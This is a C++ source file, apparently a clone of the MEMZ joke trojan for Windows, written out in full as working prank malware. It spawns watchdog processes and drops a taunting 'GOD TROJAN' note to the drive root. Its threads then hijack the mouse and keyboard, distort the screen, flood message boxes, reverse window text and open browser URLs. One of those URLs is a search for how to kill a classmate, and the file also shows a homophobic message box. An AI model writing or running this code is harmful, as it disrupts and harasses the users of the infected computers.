#include <windows.h>
#include <random>
#include <WinUser.h>

// gcc MEMZ.cpp -o MEMZ -mwindows -lgdi32 -lstdc++ -lwinmm

typedef struct{
    int temp;
    int (*func)();
}functable;

int openWeb(){
    LPCSTR web[4] = {
        "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
        "https://www.youtube.com/watch?v=saNzVNhMSn0",
        "https://www.youtube.com/watch?v=BbeeuzU5Qc8",
        "https://www.google.com/search?q=how+do+i++kill+my+classmate&client=firefox-b-d&sca_esv=590844747&sxsrf=AM9HkKnRNhec1CreaHOArOnT8akBl21GVg%3A1702548760915&ei=GNV6ZZ69N-rm2roP74WNqAw&ved=0ahUKEwieqe2w2I6DAxVqs1YBHe9CA8UQ4dUDCBA&uact=5&oq=how+do+i++kill+my+classmate&gs_lp=Egxnd3Mtd2l6LXNlcnAiG2hvdyBkbyBpICBraWxsIG15IGNsYXNzbWF0ZUicIFCKBlj4GXACeACQAQCYAWKgAZUDqgEBNrgBA8gBAPgBAeIDBBgBIEGIBgE&sclient=gws-wiz-serp"
    };
    while(1){
        ShellExecuteA(NULL, "open", web[rand()%4], NULL, NULL, SW_SHOWNORMAL);
        Sleep(10000);
    }
}

int cursor(){
    int a=0;

    while(true){
        tagPOINT p;

        if(GetKeyState(VK_ESCAPE) & 0x8000)
            break;
        
        GetCursorPos(reinterpret_cast<LPPOINT>(&p));

        int a1, a2, b1, b2;

        a2 = rand() % 1000;
        b2 = rand() % 1000;

        a1 = rand() % (a/10000+2);
        b1 = rand() % (a/10000+2);

        SetCursorPos(p.x+a1*(a2%3-1), p.y+b1*(b2%3-1));
        Sleep(10);

        a++;
    }
}

int desktopHole(){
    HWND DesktopWindow;
    HDC WindowDC;
    RECT Rect;

    while(1){
        DesktopWindow = GetDesktopWindow();
        WindowDC = GetWindowDC(DesktopWindow);
        GetWindowRect(DesktopWindow, &Rect);
        StretchBlt(WindowDC, 50, 50, Rect.right-100, Rect.bottom-100, WindowDC, 0, 0, Rect.right, Rect.bottom, SRCCOPY);
        Sleep(2000);
    }
}

int desktopColor(){
    HWND DesktopWindow;
    HDC WindowDC;
    RECT Rect;
    while(1){

        DesktopWindow = GetDesktopWindow();
        WindowDC = GetWindowDC(DesktopWindow);

        GetWindowRect(DesktopWindow, &Rect);

        BitBlt(WindowDC, 0, 0, Rect.right - Rect.left, Rect.bottom - Rect.top, WindowDC, 0, 0, 0x330008u);
        Sleep(1500);
        ReleaseDC(DesktopWindow, WindowDC);
    }
}

int playSound(){
    LPCSTR sound[2] = {"SystemExclamation", "SystemHand"};

    while(1){

        int num = rand() % 2;
        PlaySoundA(sound[num], NULL, 1);
        Sleep(1500);

    }
}

int drawIcon(){
    POINT point;
    HWND hwnd;
    RECT Rect;
    int a,b;
    int t=0;

    while(1){

        a = GetSystemMetrics(11)/2;
        b = GetSystemMetrics(12)/2;

        GetCursorPos(&point);
        hwnd = GetDesktopWindow();
        GetWindowRect(hwnd, &Rect);

        DrawIcon(GetWindowDC(hwnd), point.x-a, point.y-b, LoadIconW(NULL, (LPCWSTR)0x7F01));

        if(t%50==0){
            DrawIcon(GetWindowDC(hwnd), rand()%( Rect.right - Rect.left ), rand()%(Rect.bottom - Rect.top ), LoadIconW(NULL, (LPCWSTR)0x7F03));
        }

        ReleaseDC(hwnd, GetWindowDC(hwnd));

        t++;
        Sleep(10);
    }
}

int keyBoard(){
    while(1){
        INPUT pInput;
        pInput.type = INPUT_KEYBOARD;
        pInput.ki.wVk = rand() % 42 + 48;
        SendInput(1, &pInput, sizeof(INPUT));
        Sleep(5000);
    }
}

int stillUse(){
    while(1){
        DWORD CurrentThreadId = GetCurrentThreadId();
        HHOOK hHook = SetWindowsHookExW(5, 0, 0, CurrentThreadId);
        MessageBoxW(NULL, L"Still using this computer?", L"lol", 0x1030u);
        UnhookWindowsHookEx(hHook);
    }
}

int __cdecl reverseString(LPWSTR lpString)
{
    int result = lstrlenW(lpString);
    if (result > 1)
    {
        int v2 = 0;
        int v3 = --result;
        int v4 = 0;
        WCHAR v5;

        do
        {
            v5 = lpString[v4];
            lpString[v4++] = lpString[v3];
            lpString[v3--] = v5;
        } while (v4 < v3);

        do
        {
            if (lpString[v2] == L'\n' && lpString[v2 + 1] == L'\r')
            {
                lpString[v2] = L'\r';
                lpString[v2 + 1] = L'\n';
            }
            ++v2;
        } while (v2 < result);
    }

    return result;
}

BOOL __stdcall EnumFunc(HWND hWnd, LPARAM a2)
{
    WCHAR *v2 = (WCHAR *)GlobalAlloc(0x40u, 0x4000u);
    if (SendMessageTimeoutW(hWnd, 0xDu, 0x2000u, (LPARAM)v2, 2u, 0x64u, 0))
    {
        reverseString(v2);
        SendMessageTimeoutW(hWnd, 0xCu, 0, (LPARAM)v2, 2u, 0x64u, 0);
    }
    GlobalFree(v2);
    return 1;
}

int doString()
{   
    while(1){
        HWND DesktopWindow = GetDesktopWindow();
        EnumChildWindows(DesktopWindow, EnumFunc, 0);
        Sleep(1000);
    }
}

int main(){

    int numArgs = 0;
    LPWSTR *args = CommandLineToArgvW(GetCommandLineW(), &numArgs);

    if(numArgs > 1){
        if(!lstrcmpW(args[1], L"/watchdog")){
            
            while(1)
                Sleep(5000);
            
            ExitProcess(0);
            
        }

        //MBR

        //Fuck by God
        CreateDirectoryA("\\happy", NULL);
        HANDLE hFile = CreateFileA("\\happy\\note.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

        if (hFile == INVALID_HANDLE_VALUE) {
            ExitProcess(4u);
        }

        const char* data = "YOUR COMPUTER HAS BEEN FUCKED BY THE GOD TROJAN.\r\n"
                        "\r\n"
                        "Your computer will be fancy later,\r\n"
                        "so use it as long as you can!\r\n"
                        "\r\n"
                        ":D\r\n"
                        "\r\n"
                        "Trying to kill GOD will cause your system to be\r\n"
                        "destroyed instantly, so don't try it :D";

        DWORD numberOfBytesWritten;
        if (!WriteFile(hFile, data, strlen(data), &numberOfBytesWritten, NULL)) {
            CloseHandle(hFile);
            ExitProcess(5u);
        }

        CloseHandle(hFile);

        ShellExecuteA(NULL, NULL, "notepad", "\\happy\\note.txt", NULL, SW_SHOWNORMAL); // create in current disk root

        //start fancy

        functable table[10];
        table[0].func = openWeb;
        table[1].func = keyBoard;
        table[2].func = cursor;
        table[3].func = drawIcon;
        table[4].func = playSound;
        table[5].func = desktopHole;
        table[6].func = desktopColor;
        table[7].func = stillUse;
        table[8].func = doString;

        
        
        for(int i =0; i < 8; i++ ){
            Sleep(20000);
            CreateThread(0, 0, (LPTHREAD_START_ROUTINE)table[i].func, 0, 0, 0);
        }
        
        
        

       //CreateThread(0, 0, (LPTHREAD_START_ROUTINE)table[2].func, 0, 0, 0);

        while(1)
            Sleep(10000);
    }

    if(MessageBoxA(
        0,
        "Are you gay?",
        "MEMZ",
        0x34u) == 6 ){
        MessageBoxA(0, "HAHA! You are Gay!", "You are Gay!",  MB_ICONSTOP|MB_OK);
        return 0;

    }
    else{
        MessageBoxA(0, "Be punished by God!", "ERROR", MB_ICONERROR|MB_OK);
    }     

    Sleep(5000);

    
    WCHAR *filename = (WCHAR*)LocalAlloc(0x40u, 0x4000u);
    GetModuleFileNameW(0, filename, 0x2000u);
   
    for(int i=0;i<5;i++){
        ShellExecuteW(NULL, NULL, filename, L"/watchdog", NULL, 10);
    }
    
    ShellExecuteW(NULL, NULL, filename, L"/main", NULL, 10);

    ExitProcess(0u);

}